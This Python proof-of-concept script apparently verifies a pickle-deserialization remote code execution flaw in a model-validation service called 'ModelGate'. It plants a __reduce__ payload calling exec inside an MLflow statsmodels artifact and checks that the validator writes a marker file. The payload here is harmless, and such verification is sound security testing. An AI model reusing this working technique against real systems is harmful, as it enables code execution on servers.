"""Safe RCE proof: create one marker file inside the validator container."""

from __future__ import annotations

import argparse
import builtins
import json
import os
import pickle
import tempfile
import time
from pathlib import Path

import httpx
import mlflow
import mlflow.statsmodels
import numpy as np
import statsmodels.api as sm

MARKER = Path("/tmp/modelgate-rce-proof")
MARKER_PREFIX = "MODELGATE_RCE_PROOF"


class MarkerPayload:
    def __reduce__(self):
        statement = (
            "from pathlib import Path; import os; "
            "Path('/tmp/modelgate-rce-proof').write_text("
            "'MODELGATE_RCE_PROOF uid=' + str(os.getuid()), encoding='utf-8')"
        )
        return builtins.exec, (statement,)


def create_artifact() -> tuple[str, str]:
    tracking_uri = os.getenv("MLFLOW_TRACKING_URI", "http://mlflow:5000")
    mlflow.set_tracking_uri(tracking_uri)
    mlflow.set_experiment("modelgate-safe-poc")

    with tempfile.TemporaryDirectory(prefix="modelgate-rce-") as temp_dir:
        model_path = Path(temp_dir) / "model"
        x = sm.add_constant(np.arange(4.0))
        y = 1.0 + np.arange(4.0)
        benign_model = sm.OLS(y, x).fit()
        mlflow.statsmodels.save_model(benign_model, model_path)

        model_pickle = model_path / "model.statsmodels"
        with model_pickle.open("wb") as handle:
            pickle.dump(MarkerPayload(), handle)

        with mlflow.start_run() as run:
            mlflow.log_artifacts(str(model_path), artifact_path="rce-proof-model")
            return run.info.run_id, f"runs:/{run.info.run_id}/rce-proof-model"


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--timeout", type=float, default=30.0, help="Seconds to wait for validation"
    )
    args = parser.parse_args()

    MARKER.unlink(missing_ok=True)
    run_id, artifact_uri = create_artifact()
    modelgate_url = os.getenv("POC_MODELGATE_URL", "http://api:8080").rstrip("/")
    model_name = f"safe-rce-proof-{int(time.time())}"

    with httpx.Client(timeout=30.0) as client:
        create = client.post(
            f"{modelgate_url}/api/models",
            json={
                "name": model_name,
                "artifact_uri": artifact_uri,
                "description": "Synthetic marker-only RCE verification",
            },
        )
        create.raise_for_status()
        job = create.json()["validation_job"]
        deadline = time.monotonic() + args.timeout
        while job["status"] not in {"succeeded", "failed"}:
            if time.monotonic() >= deadline:
                raise TimeoutError("Validation job did not finish before the timeout")
            time.sleep(0.5)
            response = client.get(f"{modelgate_url}/api/jobs/{job['id']}")
            response.raise_for_status()
            job = response.json()

    if not MARKER.exists():
        raise RuntimeError("RCE proof failed: validator marker file was not created")
    marker_text = MARKER.read_text(encoding="utf-8")
    if not marker_text.startswith(MARKER_PREFIX):
        raise RuntimeError("RCE proof failed: marker content did not match")

    print(
        json.dumps(
            {
                "proof": "rce",
                "success": True,
                "run_id": run_id,
                "model_name": model_name,
                "model_version": "1",
                "validation_job": job["id"],
                "validation_status": job["status"],
                "marker_path": str(MARKER),
                "marker": marker_text,
                "pickle_safety_setting": os.getenv(
                    "MLFLOW_ALLOW_PICKLE_DESERIALIZATION", "unset"
                ),
            },
            ensure_ascii=False,
        )
    )


if __name__ == "__main__":
    main()
